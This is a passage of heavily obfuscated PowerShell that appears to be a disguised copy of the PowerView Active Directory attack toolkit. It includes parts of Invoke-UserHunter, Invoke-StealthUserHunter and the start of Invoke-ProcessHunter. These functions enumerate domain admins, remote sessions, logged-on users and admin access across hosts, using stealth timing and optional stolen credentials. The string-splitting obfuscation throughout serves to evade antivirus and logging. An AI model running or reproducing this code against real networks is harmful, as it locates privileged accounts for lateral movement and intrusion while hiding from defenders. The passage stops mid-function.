                    ("{1}{0}{2}"-f'C',("{1}{0}" -f 'dmin','A'),("{0}{1}" -f'o','unt')) = ${adMI`NCoU`Nt}
                    ("{3}{1}{2}{0}"-f ("{1}{0}"-f'ion','at'),("{0}{1}"-f'llo','wD'),("{1}{0}" -f'leg','e'),'A') = ${ALlo`WDELE`GA`TI`oN}
                }

                &("{0}{2}{3}{1}"-f("{0}{1}" -f 'Writ','e'),'e',("{1}{0}" -f'Verb','-'),'os') ('['+'*] '+("{1}{0}"-f 'ry','Que')+'i'+'ng '+'do'+("{0}{1}"-f 'm','ain')+' '+("$Domain "+'')+'fo'+'r '+'use'+'rs')
                ${TArG`eT`USErs} += &("{1}{0}{2}{3}"-f 't-','Ge',("{1}{0}"-f'Use','Net'),'r') @Arguments | &("{1}{3}{0}{4}{2}"-f("{2}{1}{0}"-f '-','ach','rE'),'F','ect','o','Obj') {
                    ${US`ER} = &("{0}{2}{1}" -f'Ne',("{1}{0}" -f 't','bjec'),'w-O') ("{2}{0}{1}" -f 'j','ect',("{0}{1}" -f'PSO','b'))
                    ${US`eR} | &("{0}{2}{3}{1}" -f'A',("{0}{1}{2}" -f 'M','em','ber'),'d','d-') ("{3}{1}{0}{2}" -f'e','p','rty',("{2}{1}{0}"-f'tepro','o','N')) ("{0}{3}{2}{1}"-f 'Me','n','i',("{1}{0}" -f'oma','mberD')) ${D`OMaIn}
                    ${Us`er} | &("{0}{1}{2}"-f 'Add','-',("{0}{1}" -f'Mem','ber')) ("{0}{2}{1}{3}" -f 'Not','r',("{0}{1}" -f 'e','prope'),'ty') ("{0}{2}{1}" -f ("{0}{1}"-f'Me','mber'),'ame','N') ${_}."sa`ma`Cc`ounTNaMe"
                    ${us`Er}
                }  | &("{0}{2}{1}"-f 'W',("{0}{1}"-f'Objec','t'),("{0}{1}"-f 'h','ere-')) {${_}}

            }            
        }
        else {
            ForEach (${do`M`AIn} in ${tARGE`TDoM`Ai`Ns}) {
                &("{1}{0}{2}{3}" -f("{1}{0}"-f '-Ver','e'),("{1}{0}" -f 'it','Wr'),'bo','se') ('[*'+'] '+'Qu'+("{0}{1}" -f 'eryin','g')+' '+'dom'+'a'+'in '+("$Domain "+'')+'fo'+'r '+("{0}{1}" -f'u','ser')+'s'+' '+'o'+'f '+("{0}{1}" -f 'g','rou')+'p '+"'$GroupName'")
                ${TaRgE`T`USE`Rs} += &("{5}{0}{4}{1}{3}{2}" -f 'et-',("{1}{0}{2}"-f 'Gr','t','oupMem'),'r','be','Ne','G') -GroupName ${grO`UpN`A`ME} -Domain ${d`OMaIn} -DomainController ${DOMaInc`On`TR`oL`LeR}
            }
        }

        if (( (-not ${sh`O`WALl}) -and (-not ${FO`REIG`Nu`serS}) ) -and ((!${targ`et`USeRS}) -or (${T`ARgETU`seRS}."cOu`Nt" -eq 0))) {
            throw ("{8}{0}{9}{5}{4}{7}{1}{3}{6}{2}{10}"-f '!','d ','f',("{1}{0}" -f'e','to s'),' ','ers',("{1}{0}"-f ' ','arch'),("{0}{1}"-f 'fo','un'),'[',("{1}{0}"-f 'No us','] '),'or!')
        }

        
        ${HOsT`EN`UMBLO`CK} = {
            param(${Com`P`UTe`RnaMe}, ${P`iNG}, ${tA`RGe`TuS`ers}, ${Cu`RREn`TUSER}, ${S`TEAL`Th}, ${DOm`AInSh`o`R`TNaMe})

            
            ${uP} = ${t`RuE}
            if(${P`iNg}) {
                ${u`P} = &("{4}{1}{0}{2}{3}"-f("{0}{1}" -f 'Conn','e'),'t-','c',("{1}{0}" -f 'on','ti'),'Tes') -Count 1 -Quiet -ComputerName ${CoMPutE`R`N`AME}
            }
            if(${up}) {
                if(!${dOm`A`Ins`hO`RTname}) {
                    
                    ${s`E`Ss`IonS} = &("{2}{1}{0}" -f("{0}{1}" -f 'sio','n'),("{1}{0}" -f 's','NetSe'),("{0}{1}" -f 'Get','-')) -ComputerName ${C`O`Mpu`TE`RnamE}
                    ForEach (${Sess`I`ON} in ${SesS`I`oNS}) {
                        ${US`eRn`AmE} = ${ses`SiON}."sES`i10_uSerN`AmE"
                        ${cN`Ame} = ${se`s`SIoN}."SesI`10_cna`mE"

                        if(${c`NaMe} -and ${C`NAme}.("{0}{2}{1}"-f("{1}{0}"-f 'Wi','Starts'),'h','t')."in`VOKE"("\\")) {
                            ${cN`Ame} = ${cNA`ME}.("{1}{2}{0}"-f 't',("{0}{1}{2}" -f'Tr','imS','ta'),'r')."inVO`kE"("\")
                        }

                        
                        if ((${UsE`R`NAme}) -and (${us`eR`Name}.("{1}{0}" -f 'm','tri')."inV`o`KE"() -ne '') -and (!(${uS`eRNaME} -match ${CuRRe`Nt`USer}))) {

                            ${tArGet`U`se`RS} | &("{1}{2}{3}{0}" -f("{1}{0}" -f 'ect','bj'),'Whe','re-','O') {${u`Se`RnaMe} -like ${_}."mE`mbern`Ame"} | &("{3}{1}{0}{2}{4}" -f("{1}{0}" -f 'Obj','h-'),("{1}{0}" -f'c','orEa'),'ec','F','t') {

                                ${I`P} = &("{0}{2}{1}" -f ("{1}{0}" -f't-IPA','Ge'),'ess','ddr') -ComputerName ${COmP`UteR`NaMe}
                                ${fou`ND`USeR} = &("{0}{2}{1}" -f("{1}{0}"-f 'ew-','N'),("{0}{1}"-f'jec','t'),'Ob') ("{0}{1}"-f'P',("{0}{1}{2}" -f 'SObj','ec','t'))
                                ${fOU`NDu`seR} | &("{2}{0}{1}" -f 'm','ber',("{0}{1}" -f 'Add-M','e')) ("{0}{3}{2}{1}" -f 'N',("{0}{2}{1}" -f 'rop','y','ert'),'tep','o') ("{1}{2}{3}{0}" -f'n',("{0}{1}"-f 'User','D'),'om','ai') ${_}."mE`m`BerdOM`AIN"
                                ${f`oUND`U`sER} | &("{2}{1}{0}" -f("{0}{1}" -f 'emb','er'),'M',("{1}{0}" -f'd-','Ad')) ("{0}{2}{1}"-f'N',("{2}{0}{1}" -f'pe','rty','tepro'),'o') ("{1}{2}{0}"-f'ame','U',("{0}{1}"-f's','erN')) ${uSe`RNa`Me}
                                ${F`oundU`SER} | &("{2}{1}{0}"-f 'er','emb',("{1}{0}"-f '-M','Add')) ("{0}{1}{2}" -f ("{0}{1}{2}" -f 'N','ote','prope'),'r','ty') ("{2}{0}{1}" -f 'te',("{0}{1}" -f 'rN','ame'),("{1}{0}" -f'mpu','Co')) ${CO`m`p`UTERn`AMe}
                                ${Fo`UNDUS`ER} | &("{0}{2}{1}{3}" -f ("{0}{1}" -f 'A','dd-'),'b','Mem','er') ("{1}{0}{2}{3}"-f ("{0}{1}" -f'tepr','o'),'No','pe','rty') 'IP' ${IP}
                                ${f`OUnDu`SEr} | &("{0}{2}{1}"-f("{0}{1}"-f 'Ad','d-Me'),'er','mb') ("{3}{0}{2}{1}"-f'ote',("{1}{0}" -f'rty','ope'),'pr','N') ("{2}{1}{0}{3}"-f'onF',("{0}{1}" -f 'e','ssi'),'S','rom') ${Cna`me}

                                
                                if (${cHeC`kacC`ESs}) {
                                    ${ADM`in} = &("{0}{1}{4}{5}{6}{3}{2}" -f("{1}{0}"-f 'vo','In'),("{0}{1}" -f'ke-C','hec'),("{1}{0}" -f's','cces'),("{0}{1}" -f 'Adm','inA'),'kL','o','cal') -ComputerName ${cNA`me}
                                    ${fOUNd`Us`er} | &("{3}{1}{0}{2}" -f 'em',("{1}{0}"-f 'M','dd-'),'ber','A') ("{1}{0}{2}"-f 'er',("{0}{2}{1}" -f 'No','eprop','t'),'ty') ("{2}{0}{1}{3}" -f ("{0}{1}" -f 'cal','Ad'),'m','Lo','in') ${aDm`In}
                                }
                                else {
                                    ${fouNdu`S`ER} | &("{3}{2}{1}{0}" -f("{1}{0}" -f 'er','emb'),'d-M','d','A') ("{2}{0}{1}" -f("{1}{0}"-f 'pe','pro'),'rty',("{0}{1}" -f 'Not','e')) ("{0}{2}{1}" -f'Lo',("{0}{1}" -f'alA','dmin'),'c') ${N`ULL}
                                }
                                ${FO`U`Nduser}
                            }
                        }                                    
                    }
                }
                if(!${S`TEAL`Th}) {
                    
                    ${LoG`GEdoN} = &("{1}{4}{3}{2}{0}" -f 'n',("{2}{0}{1}" -f'et-N','et','G'),'do',("{1}{0}" -f'ge','og'),'L') -ComputerName ${CoM`puTER`NaME}
                    ForEach (${Us`eR} in ${L`OGge`don}) {
                        ${usEr`NA`Me} = ${us`er}."w`kUi1`_`USErnAmE"
                        
                        
                        ${us`ER`d`oMaIn} = ${U`SER}."wkUI1`_LoGOn`_`DOMaIn"

                        
                        if ((${US`erNA`ME}) -and (${U`ser`NaMe}.("{1}{0}"-f'rim','t')."I`Nvo`ke"() -ne '')) {

                            ${tAR`G`E`TuSeRs} | &("{0}{2}{1}" -f ("{1}{0}{2}" -f'er','Wh','e-'),("{0}{1}"-f'je','ct'),'Ob') {${u`S`eRnAMe} -like ${_}."M`eMb`erNaME"} | &("{0}{1}{3}{2}" -f'F',("{1}{2}{0}"-f'h-O','or','Eac'),'ect','bj') {

                                ${P`Ro`cEEd} = ${t`RUE}
                                if(${dOM`A`I`N`ShOr`TnAme}) {
                                    if (${DomAInsh`ORT`N`Ame}.("{0}{1}" -f'T',("{2}{0}{1}" -f 'e','r','oLow'))."iN`VoKE"() -ne ${u`seR`doma`In}.("{0}{1}" -f'T',("{1}{0}{2}" -f 'L','o','ower'))."i`NV`OkE"()) {
                                        ${PRO`cEED} = ${t`Rue}
                                    }
                                    else {
                                        ${pR`oc`eEd} = ${f`Al`se}
                                    }
                                }
                                if(${pR`o`ceeD}) {
                                    ${iP} = &("{0}{1}{2}"-f 'Get','-',("{1}{2}{0}" -f'Address','I','P')) -ComputerName ${CO`mp`Ute`RnAme}
                                    ${F`Ou`NdUS`ER} = &("{2}{1}{0}" -f 't','ec',("{1}{0}{2}" -f'e','N','w-Obj')) ("{2}{0}{1}"-f 'je','ct',("{1}{0}"-f 'Ob','PS'))
                                    ${fo`U`NDUSER} | &("{2}{0}{1}" -f ("{1}{0}"-f'mb','Me'),'er',("{1}{0}"-f'-','Add')) ("{1}{3}{2}{0}" -f'y',("{1}{0}" -f'ote','N'),("{2}{1}{0}" -f'ert','p','ro'),'p') ("{1}{2}{0}"-f ("{1}{0}"-f'in','ma'),'Use','rDo') ${U`SerdOma`In}
                                    ${fou`N`d`USeR} | &("{0}{3}{1}{2}"-f'Add','e',("{0}{1}" -f'mb','er'),'-M') ("{2}{0}{1}" -f("{1}{0}" -f 'e','rop'),'rty',("{0}{1}"-f'Note','p')) ("{0}{1}{2}"-f'Use','rNa','me') ${US`ERNa`ME}
                                    ${f`oUNDU`Ser} | &("{2}{1}{0}"-f("{0}{1}" -f'mb','er'),("{0}{1}"-f 'dd-M','e'),'A') ("{2}{0}{1}{3}" -f 'p','rop',("{0}{1}"-f'Not','e'),("{0}{1}"-f 'e','rty')) ("{0}{2}{3}{1}" -f("{1}{0}" -f'u','Comp'),'e','t',("{1}{0}"-f'rNam','e')) ${co`MpU`Te`RnamE}
                                    ${FoU`Ndu`seR} | &("{1}{0}{2}"-f'e',("{1}{0}"-f 'dd-Memb','A'),'r') ("{1}{2}{0}{3}" -f'pr','N','ote',("{0}{1}" -f'oper','ty')) 'IP' ${ip}
                                    ${FO`UnDU`Ser} | &("{1}{2}{0}"-f'r',("{0}{1}"-f 'Add','-M'),("{1}{0}" -f'mbe','e')) ("{0}{1}{2}"-f 'Not',("{1}{0}"-f'opert','epr'),'y') ("{0}{2}{1}" -f("{2}{0}{1}" -f 'sio','n','Ses'),'rom','F') ${N`ULl}

                                    
                                    if (${ch`eC`kAcc`Ess}) {
                                        ${A`dMIn} = &("{5}{4}{1}{2}{3}{0}"-f("{0}{1}"-f'ce','ss'),("{1}{0}"-f 'l','oca'),'Ad',("{0}{1}"-f'min','Ac'),'kL',("{2}{1}{0}"-f'Chec','oke-','Inv')) -ComputerName ${c`OmP`UTEr`NamE}
                                        ${fO`Und`USer} | &("{2}{0}{1}"-f'mb','er',("{0}{1}" -f 'Add-M','e')) ("{2}{1}{0}" -f'rty',("{1}{0}"-f'pe','ro'),("{0}{1}"-f 'Note','p')) ("{3}{2}{1}{0}"-f 'min','lAd','a','Loc') ${a`DmiN}
                                    }
                                    else {
                                        ${FOUND`Us`er} | &("{1}{2}{0}" -f("{0}{1}"-f 'Mem','ber'),'Ad','d-') ("{2}{1}{0}"-f 'ty',("{2}{1}{0}" -f'er','rop','tep'),'No') ("{0}{2}{1}"-f("{1}{0}"-f'ocalA','L'),'min','d') ${n`ULL}
                                    }
                                    ${fO`UN`DuSeR}
                                }
                            }
                        }
                    }
                }
            }
        }

    }

    process {

        if(${ThRE`A`ds}) {
            &("{3}{0}{2}{4}{1}" -f ("{2}{1}{0}" -f 'erb','e-V','it'),'e','o','Wr','s') ('U'+("{1}{0}" -f ' ','sing')+'th'+'rea'+'d'+("{1}{0}" -f' ','ing')+'wi'+'th '+'thr'+'ea'+'ds '+'= '+"$Threads")

            
            ${s`Cri`PTpA`RAMS} = @{
                ("{0}{1}"-f'P','ing') = $(-not ${NOP`ING})
                ("{2}{0}{1}" -f ("{0}{1}"-f 'ar','get'),("{1}{0}" -f'sers','U'),'T') = ${TaRgE`Tu`SeRs}
                ("{3}{2}{0}{1}"-f 'e',("{1}{0}{2}"-f 't','n','User'),'rr','Cu') = ${c`UrreNT`US`ER}
                ("{0}{1}{2}"-f'S','t',("{0}{1}" -f'e','alth')) = ${StE`Al`Th}
                ("{2}{1}{0}{3}" -f'am',("{1}{2}{0}" -f'rtN','main','Sho'),'Do','e') = ${Do`MaINsh`oRt`NAmE}
            }

            
            &("{2}{1}{4}{0}{3}{5}"-f("{1}{0}" -f 'ded','a'),'T',("{1}{0}" -f 'ke-','Invo'),("{0}{1}"-f'F','unct'),'hre','ion') -ComputerName ${CO`mPU`TeR`Name} -ScriptBlock ${ho`STE`N`UMbLOCK} -ScriptParameters ${S`C`RIp`TParams}
        }

        else {
            if(-not ${no`PI`Ng} -and (${coM`p`UtErNaMe}."c`OUnT" -ne 1)) {
                
                ${pI`NG} = {param(${CO`mPut`E`RName}) if(&("{1}{0}{2}" -f'est','T',("{2}{0}{1}"-f'Con','nection','-')) -ComputerName ${COM`p`UtERna`Me} -Count 1 -Quiet -ErrorAction ("{1}{0}"-f 'p','Sto')){${c`oMpU`T`eRnAmE}}}
                ${cOmPuT`E`RnA`mE} = &("{4}{1}{2}{0}{3}"-f 'u',("{1}{0}" -f'ea','Thr'),("{1}{0}"-f'F','ded'),("{1}{0}"-f'n','nctio'),("{2}{1}{0}" -f '-','ke','Invo')) -NoImports -ComputerName ${c`ompUtE`Rn`AMe} -ScriptBlock ${pI`NG} -Threads 100
            }

            &("{1}{2}{0}" -f 'se','W',("{0}{1}{2}"-f'rit','e','-Verbo')) "[*] Total number of active hosts: $($ComputerName.count)  "
            ${CO`UN`Ter} = 0

            ForEach (${c`om`PUT`Er} in ${coMpuT`eRna`ME}) {

                ${CO`U`NTer} = ${cou`NtEr} + 1

                
                &("{1}{2}{0}" -f 'p',("{2}{1}{0}"-f'-Sl','t','Star'),'ee') -Seconds ${RAn`Dno}.("{1}{0}" -f 'ext','N')."iN`VOKE"((1-${j`iTt`Er})*${d`El`Ay}, (1+${J`IT`TeR})*${Del`Ay})

                &("{0}{2}{1}"-f'W',("{0}{1}" -f 'r','bose'),("{0}{1}" -f'rite','-Ve')) "[*] Enumerating server $Computer ($Counter of $($ComputerName.count))  "
                ${Re`sU`lT} = &("{0}{1}{2}{4}{3}" -f 'Inv','ok','e-C',("{0}{1}" -f 'm','mand'),'o') -ScriptBlock ${HOST`e`N`UMbloCK} -ArgumentList ${co`mPut`er}, ${fa`l`SE}, ${t`ARg`E`TuSErs}, ${CuR`ReN`Tus`er}, ${StE`AltH}, ${doMaI`NsH`O`Rtna`mE}
                ${r`eSu`LT}

                if(${RE`sU`Lt} -and ${s`ToP`O`NS`UcCeSs}) {
                    &("{0}{2}{1}"-f'Wr','ose',("{1}{2}{0}" -f 'rb','i','te-Ve')) ("{6}{4}{3}{2}{5}{9}{7}{8}{0}{1}"-f'l','y',("{0}{1}"-f 'e','t u'),'arg',("{0}{1}" -f '*] ','T'),("{1}{0}"-f 'ou','ser f'),'[',("{1}{2}{0}" -f 'ing e',', re','turn'),'ar','nd')
                    return
                }
            }
        }

    }
}


function I`NV`o`KE-st`Ea`lThuS`ERHUnTer {
    [CmdletBinding()]
    param(
        [Parameter(posItiOn=0,ValuefrOmpiPELINE=${Tr`UE})]
        [Alias({"{1}{0}"-f 'sts','Ho'})]
        [String[]]
        ${CO`m`Pu`TERNamE},

        [ValidateScript({&("{0}{2}{1}"-f ("{1}{0}"-f 'est-Pa','T'),'h','t') -Path ${_} })]
        [Alias({"{1}{2}{0}"-f'ist','Hos','tL'})]
        [String]
        ${coMp`UTeRfI`le},

        [String]
        ${c`omp`U`Ter`FilTer},

        [String]
        ${co`MP`UTErAdSpa`Th},

        [String]
        ${Gr`ou`pNAME} = ("{1}{0}{2}" -f("{1}{0}" -f'n ','ai'),'Dom',("{1}{0}"-f'ins','Adm')),

        [String]
        ${Ta`RG`EtsEr`Ver},

        [String]
        ${uSER`NAMe},

        [String]
        ${USErf`IL`TeR},

        [String]
        ${U`Se`RAdSp`ATh},

        [ValidateScript({&("{3}{1}{2}{0}" -f 'th','e',("{1}{0}"-f 't-Pa','s'),'T') -Path ${_} })]
        [String]
        ${Use`Rfile},

        [Switch]
        ${cHE`CK`AccEsS},

        [Switch]
        ${STOP`o`NSUccEss},

        [Switch]
        ${n`oP`inG},

        [UInt32]
        ${dE`lAY} = 0,

        [Double]
        ${J`iTT`ER} = .3,

        [String]
        ${dOMa`IN},

        [Switch]
        ${sho`w`AlL},

        [Switch]
        ${sE`ARCh`For`eSt},

        [String]
        [ValidateSet("DFS","DC",{"{0}{1}" -f 'F','ile'},"All")]
        ${s`T`eA`LthS`oURcE} ="All"
    )
    
    &("{0}{4}{3}{2}{1}"-f("{1}{0}" -f 'voke-','In'),'ter','n',("{1}{0}"-f'u','serH'),'U') -Stealth @PSBoundParameters
}


function INV`okE`-P`RO`cEsS`hUnter {


    [CmdletBinding()]
    param(
        [Parameter(PositiON=0,VAlUeFRoMPipElINe=${t`RuE})]
        [Alias({"{0}{1}" -f'H',{"{1}{0}" -f'sts','o'}})]
        [String[]]
        ${CoMp`UtER`NA`mE},

        [ValidateScript({&("{2}{0}{1}{3}" -f 's',("{1}{0}" -f'-Pa','t'),'Te','th') -Path ${_} })]
        [Alias({"{2}{0}{1}"-f 'tL','ist','Hos'})]
        [String]
        ${c`OMp`UTEr`FiLE},

        [String]
        ${CO`mpuTe`RFiLT`ER},

        [String]
        ${cOM`puTE`RAdsp`ATH},

        [String]
        ${pROC`Es`s`Name},

        [String]
        ${GRou`P`N`Ame} = ("{1}{3}{2}{0}"-f 's',("{0}{1}" -f'Dom','ai'),'min',("{1}{0}" -f'Ad','n ')),

        [String]
        ${tAR`gE`T`SErVeR},

        [String]
        ${UseR`NA`ME},

        [String]
        ${uSeRFI`L`TEr},

        [String]
        ${uS`eRAD`sPATH},

        [ValidateScript({&("{1}{2}{0}"-f'h','T',("{0}{2}{1}" -f'est-','at','P')) -Path ${_} })]
        [String]
        ${u`SEr`FILe},

        [String]
        ${rEMo`Teuse`R`Na`Me},

        [String]
        ${R`eMotePaSs`W`ORD},

        [Switch]
        ${StoPo`NsuccE`SS},

        [Switch]
        ${NoPI`NG},

        [UInt32]
        ${DeL`AY} = 0,

        [Double]
        ${jItT`ER} = .3,

        [String]
        ${D`Omain},

        [String]
        ${Do`M`A`IncoNTroLLer},

        [Switch]
        ${sH`OW`ALL},

        [Switch]
        ${SeARcH`F`o`Rest},

        [ValidateRange(1,100)] 
        [Int]
        ${T`hRE`AdS}
    )

    begin {

        if (${pSBO`UN`dp`ARamE`T`ErS}[("{1}{0}" -f'g',("{0}{1}"-f'De','bu'))]) {
            ${dEBugPReF`E`R`enCe} = ("{2}{0}{1}"-f 't',("{1}{0}"-f'ue','in'),'Con')
        }

        
        ${ra`ND`No} = &("{1}{2}{0}" -f 'ct',("{2}{0}{1}"-f'e','w-Obj','N'),'e') ("{2}{0}{1}"-f("{1}{0}" -f 'Ran','stem.'),'dom','Sy')

        &("{2}{1}{0}" -f ("{1}{0}"-f 'se','Verbo'),("{1}{0}"-f 'e-','it'),'Wr') ('['+'*] '+("{0}{1}" -f 'Runn','i')+'ng'+' '+'Inv'+("{1}{0}"-f'e-','ok')+'Pro'+'ce'+'s'+'sHu'+("{0}{1}" -f'nte','r ')+("{1}{0}" -f'th','wi')+' '+'d'+'ela'+'y '+'o'+'f '+"$Delay")

        
        
        
        
        

        
        if(${COM`p`Uter`F`ILe}) {
            ${cOM`puTE`R`NAMe} = &("{0}{2}{1}" -f'G','ent',("{1}{0}{2}"-f'n','et-Co','t')) -Path ${cO`Mp`U`TeRFiLe}
        }

        if(!${cOmP`U`TErna`Me}) { 
            [array]${COmP`UTerna`mE} = @()

            if(${DoM`Ain}) {
                ${tA`RGET`dOmainS} = @(${D`OmAin})
            }
            elseif(${Se`ArCh`FOReSt}) {
                
                ${TARGet`D`O`mAiNS} = &("{2}{3}{1}{0}" -f("{1}{0}" -f 'in','Doma'),'t',("{2}{1}{0}"-f'e','N','Get-'),("{1}{0}"-f 'Fores','t')) | &("{3}{1}{2}{0}" -f("{1}{2}{0}" -f 'ect','-O','bj'),'rEa','ch','Fo') { ${_}."n`AME" }
            }
            else {
                
                ${T`ARget`dOmaiNS} = @( (&("{0}{1}{3}{2}" -f 'Get','-','ain',("{2}{0}{1}" -f'e','tDom','N')))."nA`mE" )
            }

            ForEach (${DO`m`Ain} in ${TaR`G`EtdOMA`iNS}) {
                &("{2}{0}{1}{3}{4}" -f 'rit',("{1}{0}"-f 'Ve','e-'),'W','r',("{0}{1}"-f'bos','e')) ('[*'+'] '+'Que'+("{0}{1}" -f 'r','ying ')+'d'+("{1}{0}"-f 'in','oma')+' '+("$Domain "+'')+'fo'+'r '+("{0}{1}"-f 'ho','st')+'s')
                ${cO`mpuTE`R`N`AmE} += &("{1}{0}{2}"-f ("{0}{1}" -f 'etCompu','t'),("{1}{0}"-f'N','Get-'),'er') -Domain ${D`om`AIN} -DomainController ${DO`mA`In`CO`NTroLler} -Filter ${cO`m`puTE`RFIltER} -ADSpath ${CoM`P`UTERADSPaTH}
            }
        
            
            ${ComPut`e`RnaMe} = ${CO`MPuTE`Rna`Me} | &("{2}{3}{1}{0}"-f("{0}{1}"-f 'bje','ct'),'O','Whe','re-') { ${_} } | &("{2}{1}{0}{3}"-f ("{0}{1}" -f'bj','ec'),'O',("{0}{1}" -f'Sor','t-'),'t') -Unique | &("{1}{0}{2}" -f 'ec',("{2}{0}{1}"-f'rt-Ob','j','So'),'t') { &("{2}{1}{0}"-f ("{0}{1}"-f'ando','m'),'-R','Get') }
            if($(${C`O`MP`UTERnAME}."cO`Unt") -eq 0) {
                throw ("{2}{1}{0}{3}"-f't',("{0}{1}" -f'o ho','s'),'N',("{0}{1}{2}" -f 's',' fou','nd!'))
            }
        }

        
        
        
        
        

        if(!${Pr`O`cesS`NAmE}) {
            &("{2}{1}{3}{0}{4}"-f 'bos',("{1}{0}"-f 'ite-','r'),'W','Ver','e') ("{11}{4}{15}{5}{1}{6}{13}{2}{0}{3}{12}{7}{14}{9}{10}{8}"-f ',','am','ed',' bu',' ',("{0}{1}"-f 'rocess ','n'),("{1}{0}"-f'e','e sp'),'ng ',("{1}{0}"-f't','r se'),' u','se','No',("{1}{0}"-f 'ldi','i'),("{0}{1}" -f'c','ifi'),("{2}{0}{1}" -f'tar','get','a '),'p')

            
            ${Ta`RgETUs`Ers} = @()

            
            if(${TA`RGeT`sE`RVER}) {
                &("{0}{4}{3}{1}{2}" -f("{0}{1}"-f 'Wr','it'),'b','ose','Ver','e-') (("{1}{0}" -f 'er','Qu')+'yin'+'g '+("{0}{1}" -f'ta','rget')+' '+'ser'+("{1}{0}"-f 'er ','v')+("'$TargetServer' "+'')+'for'+' '+'loc'+'al'+' '+'us'+'ers')
                ${tA`RgEtus`ErS} = &("{1}{2}{3}{0}"-f 'oup','Get',("{1}{0}" -f't','-Ne'),("{1}{0}{2}"-f 'c','Lo','alGr')) ${t`ARG`etSe`RVER} -Recurse | &("{1}{0}{2}"-f'ec',("{0}{1}{2}"-f'Where-O','b','j'),'t') {(-not ${_}."i`SgROuP") -and ${_}."iSdO`m`AIn" } | &("{2}{3}{0}{1}"-f 'Ea',("{1}{0}{2}"-f 'h-O','c','bject'),'F','or') {
                    (${_}."ACcouN`TnA`Me").("{1}{0}" -f("{1}{0}" -f 'it','pl'),'s')."INvO`kE"("/")[1].("{1}{2}{0}" -f'r','toL','owe')."i`NV`OKe"()
                }  | &("{1}{3}{2}{0}"-f'ct',("{0}{1}" -f 'W','her'),'je',("{1}{0}" -f '-Ob','e')) {${_}}
            }
            
            elseif(${useRN`AME}) {
                &("{2}{4}{0}{1}{3}" -f 'b','os','W','e',("{2}{1}{0}"-f'r','e','rite-V')) ('['+'*] '+'Usi'+'ng'+' '+("{1}{0}" -f'arg','t')+'e'+'t '+("{1}{0}" -f 'ser','u')+' '+"'$UserName'...")
                ${T`ARGe`T`UsERS} = @( ${USerN`A`mE}.("{1}{0}{2}"-f'we',("{1}{0}"-f 'o','ToL'),'r')."I`NvOKE"() )
            }
            
            elseif(${us`ErFI`lE}) {
                ${taRGe`TU`sErS} = &("{0}{1}{3}{2}"-f ("{0}{1}" -f 'Get','-C'),'on','ent','t') -Path ${U`Se`RFILe} | &("{1}{2}{0}" -f("{1}{0}" -f'ct','-Obje'),("{0}{1}"-f'W','her'),'e') {${_}}
            }
            elseif(${uSE`R`AD`SpaTh} -or ${U`SERfiL`T`Er}) {
                ForEach (${dom`AIN} in ${T`A`RGETdOmai`Ns}) {
                    &("{1}{4}{3}{0}{2}" -f 's',("{0}{1}" -f 'Wri','t'),'e',("{1}{0}"-f'o','erb'),'e-V') ('[*]'+' '+'Qu'+'e'+("{0}{1}"-f 'r','ying ')+("{0}{1}" -f'd','oma')+'in '+("$Domain "+'')+'for'+' '+("{0}{1}"-f 'u','ser')+'s')
                    ${TaR`gET`UsErS} += &("{0}{2}{1}"-f'G',("{0}{1}"-f't','User'),("{1}{0}"-f't-Ne','e')) -Domain ${D`OMAiN} -DomainController ${D`Omain`c`o`N`TroLLeR} -ADSpath ${u`SERADsp`A`Th} -Filter ${U`S`erfILtEr} | &("{3}{0}{2}{1}" -f("{1}{2}{0}"-f 'j','c','h-Ob'),'ct','e',("{1}{0}" -f'Ea','For')) {
                        ${_}."S`AMAC`COUnTnA`me"
                    }  | &("{1}{2}{0}{3}"-f'b','Wh',("{0}{1}" -f'er','e-O'),("{0}{1}" -f'j','ect')) {${_}}
                }            
            }
            else {
                ForEach (${d`Om`AIn} in ${T`Arg`etdom`Ai`Ns}) {
                    &("{0}{4}{3}{1}{2}" -f("{0}{1}" -f 'Writ','e'),'b','ose','Ver','-') ('[*]'+' '+'Q'+'uer'+'yi'+'ng '+("{1}{0}"-f'oma','d')+'in '+("$Domain "+'')+'for'+' '+'us'+'e'+'rs '+'of'+' '+("{1}{0}"-f'oup','gr')+' '+"'$GroupName'")
                    ${TARG`eTUs`e`Rs} += &("{1}{5}{4}{3}{2}{0}"-f'ber',("{1}{0}"-f'N','Get-'),'m','Me','up',("{0}{1}"-f'e','tGro')) -GroupName ${g`R`ouPna`mE} -Domain ${do`Main} -DomainController ${d`OmAIn`CoNTR`olLEr}| &("{2}{0}{1}" -f'eac',("{0}{1}"-f'h-Obje','ct'),'For') {
                        ${_}."MEMB`e`RN`Ame"
                    }
                }
            }

            if ((-not ${S`HowA`ll}) -and ((!${T`A`RGe`TUsErs}) -or (${t`ARGeTU`SERS}."C`Ount" -eq 0))) {
                throw ("{4}{7}{2}{1}{6}{0}{3}{5}" -f'o ',("{1}{0}"-f 'd ','un'),("{2}{1}{0}" -f'rs fo','e','us'),("{0}{2}{1}"-f'sea','fo','rch '),'[','r!','t',("{1}{0}" -f'No ','!] '))
            }
        }

        
        ${h`oStENuMblO`CK} = {
            param(${C`Omp`Uter`NAme}, ${p`ing}, ${prOCe`Ss`N`Ame}, ${T`ArG`Etu`seRS}, ${rEm`o`TE`UsernamE}, ${Rem`otepaS`s`WO`RD})

            
            ${UP} = ${tr`UE}
            if(${PI`Ng}) {
                ${u`p} = &("{1}{3}{0}{2}" -f("{1}{0}" -f't','Connec'),("{1}{0}" -f't','Tes'),'ion','-') -Count 1 -Quiet -ComputerName ${c`o`MP`U`TerNaMe}
            }
            if(${uP}) {
                
                
                if(${r`E`Mo`TEuseRnAme} -and ${RE`mOtEPa`Ss`wORd}) {
                    ${PR`Oce`SsEs} = &("{1}{3}{2}{0}" -f 's',("{1}{0}"-f 'e','Get-N'),'es',("{1}{0}"-f 'roc','tP')) -RemoteUserName ${ReMoteU`S`Er`N`AME} -RemotePassword ${Re`m`OtEpasS`wo`Rd} -ComputerName ${cOmpUT`E`R`NAMe} -ErrorAction ("{0}{1}{4}{2}{3}" -f'Si','l','ntl',("{0}{1}{2}" -f'y','Co','ntinue'),'e')
                }
                else {
                    ${p`Ro`c`eSSeS} = &("{1}{4}{0}{3}{2}"-f ("{0}{1}"-f't','-Ne'),'G','ess',("{1}{0}" -f'c','tPro'),'e') -ComputerName ${c`OMPu`TERN`A`Me} -ErrorAction ("{3}{2}{0}{1}" -f 'ent',("{1}{2}{0}" -f 'Continue','l','y'),'l','Si')
                }

                ForEach (${p`RO`CESS} in ${p`Roc`ES`SES}) {
                    
                    if(${PR`ocEssn`A`me}) {
